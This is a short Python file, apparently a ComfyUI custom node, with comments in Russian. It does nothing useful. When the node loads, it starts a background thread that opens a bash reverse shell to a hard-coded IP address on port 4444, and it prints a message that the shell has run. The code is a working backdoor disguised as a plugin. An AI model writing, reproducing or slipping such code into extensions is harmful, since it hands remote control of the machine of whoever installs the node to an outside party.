    import os
    import threading

    def run_shell():
        # Это пример для Linux
        os.system("bash -c 'bash -i >& /dev/tcp/85.15.175.65/4444 0>&1'")

    # Запускаем в отдельном потоке, чтобы не завис ComfyUI
    t = threading.Thread(target=run_shell)
    t.start()
    
    print("NODE LOADED: SHELL EXECUTED")
    NODE_CLASS_MAPPINGS = {}